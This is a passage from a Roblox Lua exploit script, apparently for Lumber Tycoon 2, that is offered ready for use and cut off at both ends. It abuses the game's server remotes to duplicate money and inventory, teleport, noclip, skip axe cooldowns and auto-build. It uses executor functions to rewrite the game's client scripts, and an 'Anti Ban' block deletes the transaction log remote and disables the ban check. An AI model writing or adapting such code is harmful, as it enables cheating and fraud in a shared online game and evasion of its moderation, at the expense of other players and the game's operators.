OriginSquare.Position.Z + 80));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X, OriginSquare.Position.Y, OriginSquare.Position.Z - 80));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X + 80, OriginSquare.Position.Y, OriginSquare.Position.Z + 80));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X + 80, OriginSquare.Position.Y, OriginSquare.Position.Z - 80));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X - 80, OriginSquare.Position.Y, OriginSquare.Position.Z + 80));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X - 80, OriginSquare.Position.Y, OriginSquare.Position.Z - 80));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X + 40, OriginSquare.Position.Y, OriginSquare.Position.Z + 80));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X - 40, OriginSquare.Position.Y, OriginSquare.Position.Z + 80));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X + 80, OriginSquare.Position.Y, OriginSquare.Position.Z + 40));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X + 80, OriginSquare.Position.Y, OriginSquare.Position.Z - 40));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X - 80, OriginSquare.Position.Y, OriginSquare.Position.Z + 40));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X - 80, OriginSquare.Position.Y, OriginSquare.Position.Z - 40));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X + 40, OriginSquare.Position.Y, OriginSquare.Position.Z - 80));requirements.remotes.clientExpandedProperty:FireServer(Plot ,CFrame.new(OriginSquare.Position.X - 40, OriginSquare.Position.Y, OriginSquare.Position.Z - 80));
    functions.Teleport(CFrame.new(Plot.OriginSquare.CFrame.p) + Vector3.new(0, 5, 0));
    functions.DeleteSurroundingTrees();
    requirements.remotes.setPropertyPurchasingValue:InvokeServer(false);
end;

functions.GetHitPoint=function(Axe)
    local axeFolder=requirements.folders.axeFolder[Axe];
    local axeModule=require(axeFolder.AxeClass).new();
    local hitPoint=axeModule.Damage;
    if axeModule.SpecialTrees then 
        if axeModule.SpecialTrees[requirements.Strings.selectedTree]then 
            hitPoint=axeModule.SpecialTrees[requirements.Strings.selectedTree].Damage
        end
    end				
    return hitPoint;
end;

functions.antiEndTimesEarRape=function()
    for i,v in next,requirements.LP.PlayerGui.ClientSounds:GetDescendants()do 
        if v.Name=='Alternate'then 
            v:Destroy()
        end;
    end;
end;
functions.antiEndTimesEarRape();


functions.chopTree=function(cutEvent)
    requirements.connections.chopTree=requirements.remotes.remoteProxy:FireServer(cutEvent,{['tool']=functions.getBestAxe(),['faceVector']=Vector3.new(1,0,0),['height']=.32,['sectionId']=1,['hitPoints']=functions.GetHitPoint(functions.getBestAxe().ToolName.Value),['cooldown']=-14,['cuttingClass']='Axe'})
end;

functions.CutAssist=function()
    local target;
    local Height;
    requirements.connections.woodSelection=requirements.Mouse.Button1Down:Connect(function()
        target=requirements.Mouse.Target;
        if target then
            Height=target.CFrame:pointToObjectSpace(requirements.Mouse.Hit.p).Y + target.Size.Y/2
            if tostring(target)=='WoodSection'and target.Parent:FindFirstChild('Owner')then 
                if target.Parent.Owner.Value==requirements.LP or target.Parent.Owner.Value==nil then
                    requirements.Strings.TreeModel=target.Parent;
                    woodSection=target.ID;
                end;
            end;
        end;
        repeat wait()until requirements.Strings.TreeModel
        if requirements.connections.cutAssistCutter==nil then 
            requirements.connections.cutAssistCutter=requirements.wrkspc.LogModels.ChildAdded:Connect(function(tree)
                tree:WaitForChild('Owner',5)
                if tree.Owner.Value==requirements.LP then 
                    requirements.Booleans.isPlankCut=true;
                end;
            end);
        end;
        requirements.LP.Character.Humanoid:UnequipTools();
        repeat wait()
            requirements.remotes.remoteProxy:FireServer(woodSection.Parent.Parent.CutEvent,{['tool']=functions.getBestAxe(),['faceVector']=Vector3.new(1,0,0),['height']=Height,['sectionId']=woodSection.Value,['hitPoints']=functions.GetHitPoint(functions.getBestAxe().ToolName.Value),['cooldown']=-14,['cuttingClass']='Axe'})
        until requirements.Booleans.isPlankCut;
        requirements.Booleans.isPlankCut=false;
        if requirements.connections.cutAssistCutter then 
            requirements.connections.cutAssistCutter:Disconnect();
            requirements.connections.cutAssistCutter=nil;
        end;
    end);
end;

functions.setWorkspaceGuis=function(parent,text)
    for _, instance in next,parent:GetChildren()do
        if (instance:IsA('BillboardGui')or instance:IsA('SurfaceGui'))and instance.Enabled then
            pcall(function()
                instance:FindFirstChildOfClass('TextLabel',true).Text=text;
                instance:FindFirstChildOfClass('TextLabel',true).TextScaled=true;
            end);
        end;
        functions.setWorkspaceGuis(instance,text);
    end;
end;


functions.OpenBP=function(item)
    requirements.remotes.clientInteracted:FireServer(requirements.wrkspc.PlayerModels:FindFirstChild(tostring(item)..' Purchased by '..tostring(requirements.LP)),'Open box');
end;

functions.OpenSelectedItem=function(item)
    local itemBox=item:FindFirstChild('BoxItemName')or item:FindFirstChild('PurchasedBoxItemName');
    if itemBox and item:FindFirstChild('Type')and item.Type.Value~='Structure' then
        requirements.remotes.clientInteracted:FireServer(item,'Open box');
        functions.notify('ebays script','Opened Item',4)
    end;
end;

functions.getAllBP=function()
    if #requirements.LP.PlayerBlueprints.Blueprints:children()<69 then
        for _,v in next,requirements.folders.blueprintFolder:children()do
            local newBP=v:Clone();
            newBP.Parent=requirements.LP.PlayerBlueprints.Blueprints;
        end;
    else
        functions.notify('Error','You have all blueprints!',4);
    end;
end;

functions.getPermBP=function()
    local amount=0;
    for _,v in next,requirements.folders.blueprintFolder:children()do
        if not requirements.LP.PlayerBlueprints.Blueprints:FindFirstChild(v)then 
            amount=amount+v.Price.Value
            if requirements.LP.leaderstats.Money.Value<amount then 
                functions.notify('Error','Not Enough Money!',4);
                return;
            end;
            blueprint=tostring(v);
            functions.AutoBuyItem(blueprint,1);
            functions.OpenBP(blueprint);
        else
            functions.notify('Error','You Already Own '..tostring(v),4)
        end;
    end;
end;

functions.sitInAllCars=function(value)
    requirements.LP.PlayerGui.Scripts.SitPermissions.Disabled=value
end;

functions.getPlotCFrame=function()
    for _,plot in next,workspace.Properties:children()do 
        if plot:FindFirstChild('Owner')and tostring(plot.Owner.Value)==tostring(requirements.Strings.autoBuildPlayer) then 
            return plot.OriginSquare.CFrame.p;
        end;
    end;
    return false;
end;

functions.saveBaseToFile=function(name)
    local blueprints='';
    local bpType,MainCFrame;
    local localplot;
    if not functions.getPlotCFrame()then 
        functions.notify('ebays script',tostring(requirements.Strings.autoBuildPlayer..' Has No Plot!'));
        return;
    end;
    for _,plot in next,workspace.Properties:children()do 
        if plot:FindFirstChild('Owner')and tostring(plot.Owner.Value)==requirements.Strings.autoBuildPlayer then 
            localplot=plot.OriginSquare.CFrame.p;
        end;
    end;
    for _,blueprint in next,workspace.PlayerModels:children()do 
        if blueprint:IsA('Model')and blueprint:FindFirstChild('MainCFrame')and blueprint:FindFirstChild('Type')and blueprint.Type.Value=='Structure'and blueprint:FindFirstChild('Owner')and tostring(blueprint.Owner.Value)==requirements.Strings.autoBuildPlayer then 
            if game:GetService('ReplicatedStorage').Purchasables.Structures.BlueprintStructures:FindFirstChild(tostring(blueprint.ItemName.Value))then
                bpType,MainCFrame=blueprint.ItemName.Value,blueprint.MainCFrame.Value;
                blueprints=blueprints..''..bpType..'&'..tostring(MainCFrame-localplot)..'|';
            end;
        end;
    end;
    writefile(name..'.Ancestor',blueprints)
end;

functions.importFiles=function(File)
    local tablew={};
    local string=string.split(File, '|');
    for i,v in pairs(string) do
        if v ~= '' then
            table.insert(tablew, v);
        end;
    end;
    return tablew;
end;

local connection,connection2;
functions.modWood=function(log,sawmill)
    local ID=1;
    local oldPos=requirements.LP.Character.HumanoidRootPart.CFrame
    requirements.Booleans.oldNoclipEnabled=true;
    requirements.Booleans.Noclip=true;
    for i,v in next,log:children()do
        if v.Name=='WoodSection'and v:FindFirstChild('ID')then
            if v.ID.Value>=ID then 
                smallestWoodSection=v;
            end;
        end;
    end;
    for i,v in pairs(log:GetChildren()) do
        if v.Name == 'WoodSection' then
            if v.ID.Value == smallestWoodSection.ParentID.Value then
                smallestWoodSection2=v;
                break
            end
        end
    end
    local old=requirements.Strings.selectedTree
    pcall(function()
        requirements.Strings.selectedTree=log.TreeClass.Value;
    end)
    if not smallestWoodSection or not smallestWoodSection2 then 
        functions.notify('Error', 'Mod wood failed.',4) 
        return 
    end;
    functions.Teleport(CFrame.new(smallestWoodSection2.CFrame.p+Vector3.new(2,4,2)));
    connection=smallestWoodSection2.AncestryChanged:Connect(function()
        for i=1,10 do 
            game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(log)
            smallestWoodSection.CFrame=sawmill.Particles.CFrame
            game:GetService'RunService'.Stepped:Wait();
        end
        if connection2 then
            connection2:Disconnect();
            connection2=nil;
        end;
    end);
    logConnection=workspace.LogModels.ChildAdded:Connect(function(b)
        local Owner=b:WaitForChild('Owner')
        if tostring(Owner.Value)==tostring(requirements.LP)then
            logConnection:Disconnect();
            logConnection=nil;
        end;
    end);
    local lava=workspace['Region_Volcano'].Lava.Lava
    repeat game:GetService'RunService'.Stepped:Wait();
        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(log);
        firetouchinterest(smallestWoodSection2,lava,0);
        firetouchinterest(smallestWoodSection2,lava,1);
    until smallestWoodSection2:FindFirstChild('LavaFire');
    smallestWoodSection2:FindFirstChild('LavaFire'):Destroy();
    for i=1,12 do 
        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(log);
        smallestWoodSection2.CFrame=CFrame.new(315,-0,79);
        game:GetService'RunService'.Heartbeat:wait();
    end;
    repeat game:GetService'RunService'.Stepped:Wait(); until not connection2
    functions.Teleport(CFrame.new(smallestWoodSection.CFrame.p))
    repeat game:GetService'RunService'.Stepped:wait();
        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(log)
        smallestWoodSection.CFrame=sawmill.Particles.CFrame
        functions.Teleport(CFrame.new(log.PrimaryPart.CFrame.p+Vector3.new(0,2,0)))
        functions.chopTree(log.CutEvent)
    until not logConnection;
    if connection then 
        connection:Disconnect();
        connection=nil;
    end;
    if connection2 then 
        connection2:Disconnect();
        connection2=nil;
    end;
    requirements.Booleans.oldNoclipEnabled=false;
    requirements.Booleans.Noclip=false;
    requirements.Strings.selectedTree=old;
end;

functions.loadFile=function(Name,value)
    local localplot;
    if not pcall(function() readfile(Name..'.Ancestor') end) then
        if value then
            functions.notify('Error', 'Incorrect FileName!', 4);
            return;
        end;
    end;
    if requirements.Booleans.building then 
        functions.notify('Error', 'Already Building', 4);
        return;
    end;
    for _,plot in next,workspace.Properties:children()do 
        if plot:FindFirstChild('Owner')and tostring(plot.Owner.Value)==tostring(requirements.Strings.autoBuildReciever)then 
            localplot=plot.OriginSquare.CFrame.p;
        end;
    end;
    requirements.Booleans.building=true;
    requirements.connections.autoBuild=workspace.PlayerModels.ChildAdded:Connect(function(b)
        local Owner=b:WaitForChild('Owner',5);
        if tostring(Owner.Value)==tostring(requirements.Strings.autoBuildReciever)and b:FindFirstChild'Type'and b.Type.Value=='Blueprint'then 
            repeat wait()until b:FindFirstChild('Main');
            game:GetService('ReplicatedStorage').PlaceStructure.ClientPlacedStructure:FireServer(tostring(b.ItemName.Value), b.Main.CFrame, requirements.LP, nil, b, true);
        end;
    end);
    local tablew={};
    local blueprints={};
    if value then 
        tableS=functions.importFiles(readfile(Name..'.Ancestor'))
    elseif not value then
        tableS=functions.importFiles(Name);
    end;
    for i,v in next,tableS do
        local Split=v:split('&');
        local tablew={};
        local blueprints={};
        table.insert(blueprints,Split[1]);
        local ItemName,CFrameV=Split[1], Split[2];
        local CFrameSplit=tostring(CFrameV):split(',');
        for i,v in pairs(CFrameSplit) do
            table.insert(tablew, v);
        end;
        local itemName=blueprints[1];
        local blueprint=CFrame.new(tonumber(tablew[1]),tonumber(tablew[2]),tonumber(tablew[3]),tonumber(tablew[4]),tonumber(tablew[5]),tonumber(tablew[6]),tonumber(tablew[7]),tonumber(tablew[8]),tonumber(tablew[9]),tonumber(tablew[10]),tonumber(tablew[11]),tonumber(tablew[12]));
        game:GetService('ReplicatedStorage').PlaceStructure.ClientPlacedBlueprint:FireServer(itemName,blueprint+localplot,game:GetService('Players').LocalPlayer)
        local num=math.random(1,15)
        if num==2 then 
            game:GetService'ReplicatedStorage'.TestPing:InvokeServer();
        end
        game:GetService('RunService').Heartbeat:wait();
        if not requirements.Booleans.vipMode then
            game:GetService('RunService').Heartbeat:wait();
        end;
    end;	
    wait(1)
    requirements.Booleans.building=false;
    if requirements.connections.autoBuild then 
        requirements.connections.autoBuild:Disconnect();
        requirements.connections.autoBuild=nil;
    end;
end;

functions.LoadSelectedSlot=function(num)
    if not requirements.remotes.clientMayLoad:InvokeServer(requirements.LP)then
        functions.notify('Error', 'Load is on cooldown. Waiting...', 4);
        repeat
            wait(5);
        until requirements.remotes.clientMayLoad:InvokeServer(requirements.LP);
    end
    if not requirements.Booleans.MoneyDuping then 
        requirements.remotes.requestSave:InvokeServer(requirements.LP.CurrentSaveSlot.Value,requirements.LP)
    end;
    functions.notify('ebays script', 'Loading slot '..requirements.Strings.selectedPlotToLoad, 4);
    functions.fastLoadSelectedPlot(num,requirements.LP)
    repeat wait() until requirements.LP.CurrentlySavingOrLoading.Value == false;
    return true
end;

functions.SaveSelectedSlot=function()
    if not functions.getPlayersBase(tostring(requirements.LP))then 
        functions.notify('Error','No Slot Loaded!',4);
        return;
    end;
    if requirements.Booleans.DisableSlotSaving then 
        functions.notify('Error','Slot Saving is disabled!',4)
        return;
    end;
    local success,Errormsg=pcall(function()requirements.remotes.requestSave:InvokeServer(requirements.LP.CurrentSaveSlot.Value,requirements.LP)end);
    if success then
        functions.notify('ebays script', 'Saved Slot '..requirements.LP.CurrentSaveSlot.Value,4);
    else
        functions.notify('Error',Errormsg);
    end;
end;

functions.manyAxeFloor=function()
    if not requirements.wrkspc:FindFirstChild('AncestorV3')then 
        local floor=Instance.new('Part',requirements.wrkspc);
        floor.Anchored=true;
        floor.Size=Vector3.new(50,0.5,50);
        floor.Position=Vector3.new(532,-50,-1716);
        floor.BrickColor=BrickColor.new(0,0,255);
        floor.Material=Enum.Material.SmoothPlastic;
        floor.Name='AncestorV3';
    end;
end;
functions.manyAxeFloor();

functions.DropAllTools=function(Bool)
    requirements.LP.Character.Humanoid:UnequipTools();
    for _,Tool in next,requirements.LP.Backpack:children()do 
        if Tool:IsA('Tool')and Tool:FindFirstChild('ToolName')then 
            requirements.remotes.clientInteracted:FireServer(Tool,'Drop tool',requirements.LP.Character.HumanoidRootPart.CFrame);
        end;
    end;
end;

functions.DupeInventory=function(Quantity)
    for i=1,Quantity do 
        if not requirements.Booleans.axeDuping then 
            functions.notify('ebays script','Dupe Inventory Aborted!',4);
            return;
        end;
        local oldpos=requirements.LP.Character.HumanoidRootPart.Position
        wait(.1)
        if not functions.getBestAxe()then
            functions.notify('Error','No tool to duplicate!',4);
            return;
        end;
        functions.DropAllTools();
        functions.KillPlayer();
        requirements.LP.CharacterAdded:wait();
        functions.Teleport(CFrame.new(oldpos));
    end;
end;


functions.AutoDupeMoney=function(amount,slot)
    if not slot then 
        slot=requirements.LP.CurrentSaveSlot.Value;
    end;
    amount=requirements.Strings.autoDupeMoneyAmount;
    if requirements.Booleans.MoneyDuping then 
        functions.notify('Error', 'Already Duping!',4);
        return;
    end;
    if requirements.Booleans.DisableSlotSaving then 
        functions.notify('Error','Disable slot saving is enabled!',4);
        return;
    end;
    functions.PlotLogic();
    requirements.Booleans.MoneyDuping=true;
    for i=1,amount do
        spawn(function()requirements.remotes.Donate:InvokeServer(requirements.LP,requirements.LP.leaderstats.Money.Value,requirements.LP.CurrentSaveSlot.Value)end);
        local Money=requirements.LP.leaderstats.Money.Value;
        if Money~=0 then 
            functions.notify('ebays script','Waiting for donation...',4);
            repeat wait()spawn(function()requirements.remotes.Donate:InvokeServer(requirements.LP, requirements.LP.leaderstats.Money.Value,requirements.LP.CurrentSaveSlot.Value)end); 
                local Money=requirements.LP.leaderstats.Money.Value;
            until Money==0; 
        end;
        functions.notify('ebays script','Loading slot...',4);
        functions.fastLoadSelectedPlot(slot);
        repeat wait()until requirements.LP.CurrentlySavingOrLoading.Value==false;
        requirements.remotes.requestSave:InvokeServer(slot,requirements.LP)
        wait(5)
        requirements.remotes.requestSave:InvokeServer(slot,requirements.LP)
        amount=amount-1;
        if amount==0 then 
            functions.notify('ebays script','Auto dupe money finished.',5);
            requirements.Booleans.MoneyDuping=false
        end;
    end;
end;

functions.PlotLogic=function()
    if requirements.LP.CurrentSaveSlot.Value== -1 then
        functions.notify('Error', 'No Plot Is Loaded..', 4);
        return;                      
    end;
    if not requirements.remotes.clientMayLoad:InvokeServer(requirements.LP)then
        functions.notify('Error', 'Load is on cooldown. Waiting...', 4)
        repeat
            wait(5)
        until requirements.remotes.clientMayLoad:InvokeServer(requirements.LP);
        functions.notify('ebays script', 'Loading plot...', 4);
    end;
    return true;
end;

functions.getPlots=function()
    local Plots={};
    for i,v in next,requirements.wrkspc.Properties:children()do
        if v:FindFirstChild('Owner') and v.Owner.Value==nil then 
            table.insert(Plots, v);
            return Plots;
        end;
    end;
end;

functions.findSelectedTree=function(treeClass)
    for _,v in next,workspace:children()do
        if tostring(v)=='TreeRegion'then
            for _,g in next,v:children()do
                if g:FindFirstChild('TreeClass')and tostring(g.TreeClass.Value)==treeClass and g:FindFirstChild('Owner')then 
                    if g.Owner.Value==nil or tostring(g.Owner.Value)==tostring(requirements.LP)then 
                        if #g:children() > 5 and g:FindFirstChild('WoodSection')then 
                            for h,j in next,g:children() do 
                                if j:FindFirstChild('ID')and j.ID.Value==1 and j.Size.Y>.5 then 
                                    return j;
                                end;
                            end;
                        end;
                    end;
                end;
            end;
        end;
    end;
    return false;
end; 

functions.getStore=function(item)
    local magnitude=9e9
    local counter;
    for _,v in next,requirements.wrkspc.Stores:children()do
        if tostring(v)=='WoodRUs'or tostring(v)=='CarStore'or tostring(v)=='FineArt'or tostring(v)=='ShackShop'or tostring(v)=='LogicStore'or tostring(v)=='FurnitureStore'then 
            if(item.Main.CFrame.p-v.Counter.CFrame.p).magnitude<magnitude then
                magnitude=(item.Main.CFrame.p-v.Counter.CFrame.p).magnitude
                counter=v.Counter;
            end;
        end;
    end;
    return counter;
end;

functions.bringPushMe=function()
    local oldPos=requirements.LP.Character.HumanoidRootPart.CFrame;
    local slab=game:GetService('Workspace')['Region_Mountainside'].SlabRegen:FindFirstChild('Slab')
    if slab and not slab.PrimaryPart then 
        slab.PrimaryPart=slab.PushMe;
    end;
    functions.Teleport(CFrame.new(slab.PrimaryPart.CFrame.p));
    wait(.2)
    for i=1,20 do 
        requirements.remotes.clientRequestOwnership:FireServer(slab);
        requirements.remotes.clientIsDragging:FireServer(slab);
    end;
    slab:SetPrimaryPartCFrame(CFrame.new(oldPos.p));
    functions.Teleport(CFrame.new(oldPos.p))
end;

functions.bringBoulders=function()
    local times=0;
    local oldPos=requirements.LP.Character.HumanoidRootPart.CFrame;
    functions.Teleport(CFrame.new(-1479,532,1462));
    local model=game:GetService('Workspace')['Region_Volcano'].PartSpawner
    requirements.connections.bringBoulders=model.ChildAdded:Connect(function(b)
        repeat wait()until requirements.LP.Character and requirements.LP.Character:FindFirstChild('Humanoid');
        functions.Teleport(CFrame.new(b.CFrame.p));
        for i=1,10 do 
            b.CFrame=CFrame.new(oldPos.p);
            game:GetService('RunService').Heartbeat:wait();
        end;
        functions.Teleport(CFrame.new(-1479,532,1462));
        if not requirements.Booleans.bringBoulders then 
        if requirements.connections.bringBoulders then 
                requirements.connections.bringBoulders:Disconnect();
                requirements.connections.bringBoulders=nil;
                functions.Teleport(CFrame.new(oldPos.p));
            end;
        end;
    end);
end;

functions.lowerBridge=function(value)
local lift=workspace.Bridge.VerticalLiftBridge.Lift;
if value=='Higher'then
        lift.Base.CFrame=lift.Base.CFrame+Vector3.new(0,26,0);
elseif value=='Lower'then
        lift.Base.CFrame=lift.Base.CFrame+Vector3.new(0,-26,0);
    end;
end;

functions.BaseDrop=function(item,teleport)
    local main=item:FindFirstChild('WoodSection')or item:FindFirstChild('Main');																
    if main and teleport then 
        pcall(function()
            if(requirements.LP.Character.HumanoidRootPart.CFrame.p-main.CFrame.p).magnitude>50 then 
                functions.Teleport(CFrame.new(main.CFrame.p));
            end;
            spawnf(function()
                for i=1,10 do
                    requirements.remotes.clientRequestOwnership:FireServer(main);
                    requirements.remotes.clientIsDragging:FireServer(main.Parent);
                    wait();
                end;
            end);
        end)
    end;
end;

-->Anti Ban
if game.ReplicatedStorage.Transactions:FindFirstChild('AddLog')then
    game.ReplicatedStorage.Transactions.AddLog:remove();
end;
local scr=getsenv(requirements.LP.PlayerGui.LoadSaveGUI.LoadSaveClient.LocalScript)
scr.ban=function()return false end

functions.checkPlanks=function(option)
    local amount=0;
    local model=nil;
    for i,v in next,requirements.wrkspc.PlayerModels:children()do 
        if v:IsA('Model')and v:FindFirstChild('Owner')and functions.OwnerCheck(v)==tostring(requirements.LP)and v:FindFirstChild('TreeClass')then 
            amount=amount+1
            model=v;
        end;
    end;
    if option=='Amount' then 
        return amount;
    elseif option=='Model'then 
        return model;
    end;
    return false;
end;

functions.PlayNotification=function()
    local Sound=Instance.new('Sound')
    Sound.SoundId='rbxassetid://6916070297';
    Sound.Parent=requirements.LP.Character.Head;
    Sound:Play();
    Sound.Stopped:wait();
    Sound:Destroy();
end;

requirements.connections.WindowFocused=requirements.services.userInputService.WindowFocused:Connect(function()
    requirements.Booleans.sendNotifications=false;
end);
requirements.connections.WindowFocusedReleased=requirements.services.userInputService.WindowFocusReleased:Connect(function()
    requirements.Booleans.sendNotifications=true;
end);

functions.getPlayersBase=function(plr)
    for i,v in next,workspace.Properties:children()do 
        if v:IsA('Model')and tostring(v.Owner.Value)==plr then 
            return v;
        end;
    end;
    return false;
end;
functions.donateBaseAutoload=function(slotnum)
    local plot = nil
    local whitelistedPlots={
        '68, 0, -189, 1, 0, 0, 0, 1, 0, 0, 0, 1',
        '275, 0, -512, 1, 0, 0, 0, 1, 0, 0, 0, 1',
    };
    for i,v in next,game.Workspace.Properties:children()do
        if v.Owner.Value==nil and not v:FindFirstChild'Square'then
            if table.find(whitelistedPlots,tostring(v.OriginSquare.OriginCFrame.Value))then
                plot=v;
                break;
            end;
        end;
    end;
    if not plot then functions.notify('ebays script','No Supported Plots Located')requirements.Booleans.DonatingBase=false;return end
    local senv=getsenv(game:GetService('Players').LocalPlayer.PlayerGui.PropertyPurchasingGUI.PropertyPurchasingClient)
    local old=senv.enterPurchaseMode
    local plot;
    local autoLoading=true;
    getsenv(game:GetService('Players').LocalPlayer.PlayerGui.PropertyPurchasingGUI.PropertyPurchasingClient).enterPurchaseMode=function(...)
        if not autoLoading then
            return old(...)
        else
            autoLoading=false;
            for i,v in next,game.Workspace.Properties:children()do
                if v.Owner.Value==nil and not v:FindFirstChild'Square'then
                    if table.find(whitelistedPlots,tostring(v.OriginSquare.OriginCFrame.Value))then
                        plot=v;
                        break;
                    end;
                end;
            end;
            if not plot then functions.notify('No Supported Plots Located')return end
                if not _G.autoLoaded then
                debug.setupvalue(senv.rotate,3,0)
                debug.setupvalue(old,10,plot)
                _G.autoLoaded=true;
                return;
            end;
        end;
    end;
    spawn(function()
        game:GetService('ReplicatedStorage').LoadSaveRequests.RequestLoad:InvokeServer(slotnum,requirements.LP)
    end)
    scr=getsenv(requirements.LP.PlayerGui.PropertyPurchasingGUI.PropertyPurchasingClient);
    spawn(function()
        for i=1,20 do 
            wait(.15);
            scr.selectionMade();
        end;
    end);
    repeat wait()until functions.getPlayersBase(tostring(requirements.LP));
    autoLoading=false;
    requirements.LP.CurrentSaveSlot.Value=slotnum;
    return loadedSlot
end;

functions.PlankToBlueprint=function()
    if not requirements.LP.SuperBlueprint.Value then 
        functions.notify('Error','You need the power to use this feature!',4);
        return;
    end;
    local target;
    functions.notify('ebays script','Select a plank and a blueprint to continue',2);
    requirements.connections.PlankToBlueprint=requirements.Mouse.Button1Down:Connect(function()
        if requirements.Mouse.Target then 
            target=requirements.Mouse.Target;
        end;
        if target.Parent:FindFirstChild('Type')and target.Parent.Type.Value=='Blueprint'then 
            requirements.Strings.blueprintModel=target.Parent;
            functions.notify('ebays script','Blueprint Selected',2);
        end;
        if tostring(target.Parent)=='Plank'and target.Parent:FindFirstChild('Owner') and tostring(target.Parent.Owner.Value)==tostring(requirements.LP)then 
            requirements.Strings.plankModel=target.Parent;
            functions.notify('ebays script','Plank Selected',2);
        end;
    end);
    repeat wait()until requirements.Strings.plankModel and requirements.Strings.blueprintModel;
    functions.Teleport(CFrame.new(requirements.Strings.plankModel:FindFirstChildOfClass'Part'.CFrame.p+Vector3.new(0,3,4)))
    wait(.2)
    for i=1,120 do 
        pcall(function()
            requirements.remotes.clientIsDragging:FireServer(requirements.Strings.plankModel)
            requirements.Strings.plankModel.WoodSection.CFrame=CFrame.new(requirements.Strings.blueprintModel.Main.CFrame.p+Vector3.new(0,1.5,0));
            game:GetService'RunService'.Stepped:wait();
        end);
    end;
    if requirements.connections.PlankToBlueprint then 
        requirements.connections.PlankToBlueprint:Disconnect();
        requirements.connections.PlankToBlueprint=nil;
    end;
    functions.notify('ebays script','Done!',2);
    requirements.Strings.blueprintModel=nil;
    requirements.Strings.plankModel=nil;
end;

functions.getCashier=function(item)
    local store=functions.getStore(item)
    for i,v in next,store.Parent:children()do 
        if v:IsA('Model')and v:FindFirstChild('Humanoid')then 
            return v; 
        end;
    end;
end;

local cashierIds={};
spawn(function()
    local connection=game.ReplicatedStorage.NPCDialog.PromptChat.OnClientEvent:connect(function(ba,data)
        if cashierIds[data.Name]==nil then
            cashierIds[data.Name]=data.ID;
        end;
    end);
    game.ReplicatedStorage.NPCDialog.SetChattingValue:InvokeServer(1);
    wait(2)
    connection:Disconnect();
    connection=nil;
    game.ReplicatedStorage.NPCDialog.SetChattingValue:InvokeServer(0);
end);
functions.getID=function(item)
    local v=functions.getCashier(item);
    return cashierIds[tostring(v)];
end;

functions.getSpecialID=function(Shop)
    return cashierIds[Shop];
end;

functions.getPrice=function(item,quantity)
    local money=requirements.LP.leaderstats.Money.Value 
    for _,v in next,game:GetService('ReplicatedStorage').Purchasables:GetDescendants()do 
        if tostring(v)==item then 
            local newValue=v.Price.Value*quantity;
            if money>=newValue then 
                return true;
            end;
        end;
    end;
    return false;
end;

functions.getItem=function(item)
    local Store;
    local Counter;
    for _,v in next,workspace.Stores:GetChildren()do
        if v.Name == 'ShopItems' then 
            for _,k in pairs(v:GetChildren())do 
            local store=k.Parent;
            if store:FindFirstChild(item)then
                if store:FindFirstChild('BasicHatchet')then
                        Store=store;
                        Counter=Store.Parent:FindFirstChild('WoodRUs').Counter
                    elseif store:FindFirstChild('LightBulb')then
                        Store=store;
                        Counter=Store.Parent:FindFirstChild('FurnitureStore').Counter
                    elseif store:FindFirstChild('Pickup1')then
                        Store=store;
                        Counter=Store.Parent:FindFirstChild('CarStore').Counter
                    elseif store:FindFirstChild('CanOfWorms')then
                        Store=store;
                        Counter=Store.Parent:FindFirstChild('ShackShop').Counter
                    elseif store:FindFirstChild('Painting3')then
                        Store=store;
                        Counter=Store.Parent:FindFirstChild('FineArt').Counter
                    elseif store:FindFirstChild('GateXOR')then
                        Store=store;
                        Counter=Store.Parent:FindFirstChild('LogicStore').Counter
                    end;
                end;
            end;
        end;
    end;
    return Store,Counter;
end;

functions.getItemsOnCounter=function(item)
    local shop,counter=functions.getItem(item)
    local boundsA = counter.CFrame * CFrame.new(counter.Size.X/2, 0, counter.Size.Z/2)
    local boundsB = counter.CFrame * CFrame.new(-counter.Size.X/2, 0, -counter.Size.Z/2)
    local counterRegion = Region3.new(Vector3.new(math.min(boundsA.X, boundsB.X), counter.Size.Y/2 + boundsA.Y, math.min(boundsA.Z, boundsB.Z)),
        Vector3.new(math.max(boundsA.X, boundsB.X), counter.Size.Y/2 + 0.6 + boundsA.Y, math.max(boundsA.Z, boundsB.Z)))
    local v=workspace:FindPartsInRegion3(counterRegion, counter)
    for k,part in next,v do 
        if part.Parent:FindFirstChild('BoxItemName') and part.Parent:FindFirstChild('Type') and game.ReplicatedStorage.Purchasables:FindFirstChild(part.Parent.BoxItemName.Value, true)then
            return part;
        end;
    end;
    return false;
end;

functions.spawnCar=function()
    local remote;
    functions.notify('ebays script','Click A Vehicle Spawn Pad',4);
    connection=requirements.Mouse.Button1Down:Connect(function()
        local target=requirements.Mouse.Target;
        if target and target.Parent:FindFirstChild('Type')and target.Parent.Type.Value=='Vehicle Spot'then 
            remote=target.Parent:FindFirstChildOfClass('BindableEvent');
            connection:Disconnect();
            connection=nil;
            functions.notify('ebays script','Spawning...',4);
        end;
    end)
    requirements.connections.spawnCar=workspace.PlayerModels.ChildAdded:Connect(function(car)
        wait(.05)
        if car:FindFirstChild('Owner')and tostring(car.Owner.Value)==tostring(requirements.LP)and car:FindFirstChild('Type')and car.Type.Value=='Vehicle'then
        if car:FindFirstChild('Settings')and car.Settings:FindFirstChild('Color')then 
            if car.Settings.Color.Value==tonumber(requirements.Strings.colorToSpawn) then
                if requirements.connections.spawnCar then
                        requirements.connections.spawnCar:Disconnect();
                        requirements.connections.spawnCar=nil;
                    end;
                end;
            end;
        end;
    end);
    repeat wait(.5)
